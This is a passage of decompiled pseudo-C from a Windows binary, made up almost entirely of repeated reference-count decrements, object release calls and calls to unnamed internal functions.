{\n                    iStack1996 = 0x409fb7;\n                    (**(**ppiStack1992 + 4))();\n                }\n                ppiStack1992 = 0x409fc3;\n                fcn.004018d0();\n                iStack2000 = 0x76c7f0;\n                iStack1996 = 0x409fd8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack1996 = 0x76c7f0;\n                    ppiStack2004 = 0x409fee;\n                    iStack2000 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2004 = iStack1544 + -0x10;\n                piVar6 = iStack1544 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2008 = 0x40a017;\n                    (**(**ppiStack2004 + 4))();\n                }\n                ppiStack2004 = 0x40a023;\n                fcn.004018d0();\n                iStack2012 = 0x76c7f0;\n                uStack2008 = 0x40a038;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack2008 = 0x76c7f0;\n                    ppiStack2016 = 0x40a04e;\n                    iStack2012 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2016 = iStack1852 + -0x10;\n                piVar6 = iStack1852 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2020 = 0x40a077;\n                    (**(**ppiStack2016 + 4))();\n                }\n                ppiStack2016 = 0x40a083;\n                fcn.004018d0();\n                iStack2024 = 0x76c7f0;\n                uStack2020 = 0x40a098;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack2020 = 0x76c7f0;\n                    ppiStack2028 = 0x40a0ae;\n                    iStack2024 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2028 = iStack1416 + -0x10;\n                piVar6 = iStack1416 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2032 = 0x40a0d7;\n                    (**(**ppiStack2028 + 4))();\n                }\n                ppiStack2028 = 0x40a0e3;\n                fcn.004018d0();\n                iStack2036 = 0x76c7f0;\n                uStack2032 = 0x40a0f8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack2032 = 0x76c7f0;\n                    ppiStack2040 = 0x40a10e;\n                    iStack2036 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2040 = iStack1868 + -0x10;\n                piVar6 = iStack1868 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack2044 = 0x40a137;\n                    (**(**ppiStack2040 + 4))();\n                }\n                ppiStack2040 = 0x40a143;\n                fcn.004018d0();\n                iStack2048 = 0x76c7f0;\n                iStack2044 = 0x40a158;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2044 = 0x76c7f0;\n                    ppiStack2052 = 0x40a16e;\n                    iStack2048 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2052 = iStack1584 + -0x10;\n                piVar6 = iStack1584 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2056 = 0x40a197;\n                    (**(**ppiStack2052 + 4))();\n                }\n                ppiStack2052 = 0x40a1a3;\n                fcn.004018d0();\n                iStack2060 = 0x76c7f0;\n                uStack2056 = 0x40a1b8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack2056 = 0x76c7f0;\n                    ppiStack2064 = 0x40a1ce;\n                    iStack2060 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2064 = ppiStack1884 + -0x10;\n                piVar6 = ppiStack1884 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2068 = 0x40a1f7;\n                    (**(**ppiStack2064 + 4))();\n                }\n                ppiStack2064 = 0x40a203;\n                fcn.004018d0();\n                iStack2072 = 0x76c7f0;\n                uStack2068 = 0x40a218;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack2068 = 0x76c7f0;\n                    ppiStack2076 = 0x40a22e;\n                    iStack2072 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2076 = iStack1352 + -0x10;\n                piVar6 = iStack1352 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2080 = 0x40a257;\n                    (**(**ppiStack2076 + 4))();\n                }\n                ppiStack2076 = 0x40a263;\n                fcn.004018d0();\n                iStack2084 = 0x76c7f0;\n                uStack2080 = 0x40a278;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack2080 = 0x76c7f0;\n                    ppiStack2088 = 0x40a28e;\n                    iStack2084 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2088 = iStack1900 + -0x10;\n                piVar6 = iStack1900 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack2092 = 0x40a2b7;\n                    (**(**ppiStack2088 + 4))();\n                }\n                ppiStack2088 = 0x40a2c3;\n                fcn.004018d0();\n                iStack2096 = 0x76c7f0;\n                iStack2092 = 0x40a2d8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2092 = 0x76c7f0;\n                    ppiStack2100 = 0x40a2ee;\n                    iStack2096 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2100 = iStack1624 + -0x10;\n                piVar6 = iStack1624 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack2104 = 0x40a317;\n                    (**(**ppiStack2100 + 4))();\n                }\n                ppiStack2100 = 0x40a323;\n                fcn.004018d0();\n                iStack2108 = 0x76c7f0;\n                iStack2104 = 0x40a338;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2104 = 0x76c7f0;\n                    ppiStack2112 = 0x40a34e;\n                    iStack2108 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2112 = iStack1916 + -0x10;\n                piVar6 = iStack1916 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2116 = 0x40a377;\n                    (**(**ppiStack2112 + 4))();\n                }\n                ppiStack2112 = 0x40a383;\n                fcn.004018d0();\n                iStack2120 = 0x76c7f0;\n                uStack2116 = 0x40a398;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack2116 = 0x76c7f0;\n                    ppiStack2124 = 0x40a3ae;\n                    iStack2120 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2124 = iStack1504 + -0x10;\n                piVar6 = iStack1504 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2128 = 0x40a3d7;\n                    (**(**ppiStack2124 + 4))();\n                }\n                ppiStack2124 = 0x40a3e3;\n                fcn.004018d0();\n                iStack2132 = 0x76c7f0;\n                uStack2128 = 0x40a3f8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack2128 = 0x76c7f0;\n                    ppiStack2136 = 0x40a40e;\n                    iStack2132 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2136 = ppiStack1932 + -0x10;\n                piVar6 = ppiStack1932 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack2140 = 0x40a437;\n                    (**(**ppiStack2136 + 4))();\n                }\n                ppiStack2136 = 0x40a443;\n                fcn.004018d0();\n                iStack2144 = 0x76c7f0;\n                iStack2140 = 0x40a458;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2140 = 0x76c7f0;\n                    ppiStack2148 = 0x40a46e;\n                    iStack2144 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2148 = iStack1664 + -0x10;\n                piVar6 = iStack1664 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2152 = 0x40a497;\n                    (**(**ppiStack2148 + 4))();\n                }\n                ppiStack2148 = 0x40a4a3;\n                fcn.004018d0();\n                iStack2156 = 0x76c7f0;\n                uStack2152 = 0x40a4b8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack2152 = 0x76c7f0;\n                    ppiStack2160 = 0x40a4ce;\n                    iStack2156 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2160 = iStack1948 + -0x10;\n                piVar6 = iStack1948 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2164 = 0x40a4f7;\n                    (**(**ppiStack2160 + 4))();\n                }\n                ppiStack2160 = 0x40a503;\n                fcn.004018d0();\n                iStack2168 = 0x76c7f0;\n                uStack2164 = 0x40a518;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack2164 = 0x76c7f0;\n                    ppiStack2172 = 0x40a52e;\n                    iStack2168 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2172 = iStack1480 + -0x10;\n                piVar6 = iStack1480 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2176 = 0x40a557;\n                    (**(**ppiStack2172 + 4))();\n                }\n                ppiStack2172 = 0x40a563;\n                fcn.004018d0();\n                iStack2180 = 0x76c7f0;\n                uStack2176 = 0x40a578;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack2176 = 0x76c7f0;\n                    ppiStack2184 = 0x40a58e;\n                    iStack2180 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2184 = iStack1964 + -0x10;\n                piVar6 = iStack1964 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack2188 = 0x40a5b7;\n                    (**(**ppiStack2184 + 4))();\n                }\n                ppiStack2184 = 0x40a5c3;\n                fcn.004018d0();\n                iStack2192 = 0x76c7f0;\n                iStack2188 = 0x40a5d8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2188 = 0x76c7f0;\n                    ppiStack2196 = 0x40a5ee;\n                    iStack2192 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2196 = ppiStack1704 + -0x10;\n                piVar6 = ppiStack1704 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2200 = 0x40a617;\n                    (**(**ppiStack2196 + 4))();\n                }\n                ppiStack2196 = 0x40a623;\n                fcn.004018d0();\n                iStack2204 = 0x76c7f0;\n                uStack2200 = 0x40a638;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack2200 = 0x76c7f0;\n                    ppiStack2208 = 0x40a64e;\n                    iStack2204 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2208 = ppiStack1980 + -0x10;\n                piVar6 = ppiStack1980 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2212 = 0x40a677;\n                    (**(**ppiStack2208 + 4))();\n                }\n                ppiStack2208 = 0x40a683;\n                fcn.004018d0();\n                iStack2216 = 0x76c7f0;\n                uStack2212 = 0x40a698;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack2212 = 0x76c7f0;\n                    ppiStack2220 = 0x40a6ae;\n                    iStack2216 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2220 = iStack1592 + -0x10;\n                piVar6 = iStack1592 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2224 = 0x40a6d7;\n                    (**(**ppiStack2220 + 4))();\n                }\n                ppiStack2220 = 0x40a6e3;\n                fcn.004018d0();\n                iStack2228 = 0x76c7f0;\n                uStack2224 = 0x40a6f8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack2224 = 0x76c7f0;\n                    ppiStack2232 = 0x40a70e;\n                    iStack2228 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2232 = iStack1996 + -0x10;\n                piVar6 = iStack1996 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack2236 = 0x40a737;\n                    (**(**ppiStack2232 + 4))();\n                }\n                ppiStack2232 = 0x40a743;\n                fcn.004018d0();\n                iStack2240 = 0x76c7f0;\n                iStack2236 = 0x40a758;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2236 = 0x76c7f0;\n                    ppiStack2244 = 0x40a76e;\n                    iStack2240 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2244 = iStack1744 + -0x10;\n                piVar6 = iStack1744 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2248 = 0x40a797;\n                    (**(**ppiStack2244 + 4))();\n                }\n                ppiStack2244 = 0x40a7a3;\n                fcn.004018d0();\n                iStack2252 = 0x76c7f0;\n                uStack2248 = 0x40a7b8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack2248 = 0x76c7f0;\n                    ppiStack2256 = 0x40a7ce;\n                    iStack2252 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2256 = iStack2012 + -0x10;\n                piVar6 = iStack2012 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2260 = 0x40a7f7;\n                    (**(**ppiStack2256 + 4))();\n                }\n                ppiStack2256 = 0x40a803;\n                fcn.004018d0();\n                iStack2264 = 0x76c7f0;\n                uStack2260 = 0x40a818;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack2260 = 0x76c7f0;\n                    ppiStack2268 = 0x40a82e;\n                    iStack2264 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2268 = iStack1512 + -0x10;\n                piVar6 = iStack1512 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2272 = 0x40a857;\n                    (**(**ppiStack2268 + 4))();\n                }\n                ppiStack2268 = 0x40a863;\n                fcn.004018d0();\n                iStack2276 = 0x76c7f0;\n                uStack2272 = 0x40a878;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack2272 = 0x76c7f0;\n                    ppiStack2280 = 0x40a88e;\n                    iStack2276 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack2280 = ppiStack2028 + -0x10;\n                piVar6 = ppiStack2028 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack2284 = 0x40a8b7;\n                    (**(**ppiStack2280 + 4))();\n                }\n                ppiStack2280 = 0x40a8c3;\n                fcn.004018d0();\n                iStack2288 = 0x76c7f0;\n                iStack2284 = 0x40a8d8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2284 = 0x76c7f0;\n                    iStack2288 = iVar5;\n                    fcn.00402c50();\n                }\n                piVar6 = iStack1784 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1784 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2296 = 0x40a938;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2296 = 0x76c7f0;\n                    fcn.00402c50();\n                }\n                piVar6 = iStack2044 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2044 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2312 = 0x76c7f0;\n                iStack2308 = 0x40a998;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2308 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2312 = iVar5;\n                }\n                piVar6 = ppiStack1680 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack1680 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2324 = 0x76c7f0;\n                iStack2320 = 0x40a9f8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2320 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2324 = iVar5;\n                }\n                piVar6 = iStack2060 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2060 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2336 = 0x76c7f0;\n                iStack2332 = 0x40aa58;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2332 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2336 = iVar5;\n                }\n                piVar6 = ppiStack1824 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack1824 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2348 = 0x76c7f0;\n                iStack2344 = 0x40aab8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2344 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2348 = iVar5;\n                }\n                piVar6 = ppiStack2076 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack2076 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2360 = 0x76c7f0;\n                iStack2356 = 0x40ab18;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2356 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2360 = iVar5;\n                }\n                piVar6 = iStack1664 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1664 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2372 = 0x76c7f0;\n                iStack2368 = 0x40ab78;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2368 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2372 = iVar5;\n                }\n                piVar6 = iStack2092 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2092 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2384 = 0x76c7f0;\n                iStack2380 = 0x40abd8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2380 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2384 = iVar5;\n                }\n                piVar6 = iStack1864 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1864 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2396 = 0x76c7f0;\n                iStack2392 = 0x40ac38;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2392 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2396 = iVar5;\n                }\n                piVar6 = iStack2108 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2108 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2408 = 0x76c7f0;\n                iStack2404 = 0x40ac98;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2404 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2408 = iVar5;\n                }\n                piVar6 = iStack1768 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1768 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2420 = 0x76c7f0;\n                iStack2416 = 0x40acf8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2416 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2420 = iVar5;\n                }\n                piVar6 = ppiStack2124 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack2124 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2432 = 0x76c7f0;\n                iStack2428 = 0x40ad58;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2428 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2432 = iVar5;\n                }\n                piVar6 = iStack1904 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1904 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2444 = 0x76c7f0;\n                iStack2440 = 0x40adb8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2440 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2444 = iVar5;\n                }\n                piVar6 = iStack2140 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2140 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2456 = 0x76c7f0;\n                iStack2452 = 0x40ae18;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2452 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2456 = iVar5;\n                }\n                piVar6 = ppiStack1728 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack1728 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2468 = 0x76c7f0;\n                iStack2464 = 0x40ae78;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2464 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2468 = iVar5;\n                }\n                piVar6 = iStack2156 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2156 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2480 = 0x76c7f0;\n                iStack2476 = 0x40aed8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2476 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2480 = iVar5;\n                }\n                piVar6 = ppiStack1944 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack1944 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2492 = 0x76c7f0;\n                iStack2488 = 0x40af38;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2488 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2492 = iVar5;\n                }\n                piVar6 = ppiStack2172 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack2172 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2504 = 0x76c7f0;\n                iStack2500 = 0x40af98;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2500 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2504 = iVar5;\n                }\n                piVar6 = iStack1856 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1856 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2516 = 0x76c7f0;\n                iStack2512 = 0x40aff8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2512 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2516 = iVar5;\n                }\n                piVar6 = iStack2188 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2188 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2528 = 0x76c7f0;\n                iStack2524 = 0x40b058;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2524 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2528 = iVar5;\n                }\n                piVar6 = iStack1984 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1984 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2540 = 0x76c7f0;\n                iStack2536 = 0x40b0b8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2536 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2540 = iVar5;\n                }\n                piVar6 = iStack2204 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2204 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2552 = 0x76c7f0;\n                iStack2548 = 0x40b118;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2548 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2552 = iVar5;\n                }\n                piVar6 = ppiStack1848 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack1848 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2564 = 0x76c7f0;\n                iStack2560 = 0x40b178;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2560 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2564 = iVar5;\n                }\n                piVar6 = ppiStack2220 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack2220 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2576 = 0x76c7f0;\n                iStack2572 = 0x40b1d8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2572 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2576 = iVar5;\n                }\n                piVar6 = iStack2024 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2024 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2588 = 0x76c7f0;\n                iStack2584 = 0x40b238;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2584 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2588 = iVar5;\n                }\n                piVar6 = iStack2236 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2236 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2600 = 0x76c7f0;\n                iStack2596 = 0x40b298;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2596 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2600 = iVar5;\n                }\n                piVar6 = ppiStack1944 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    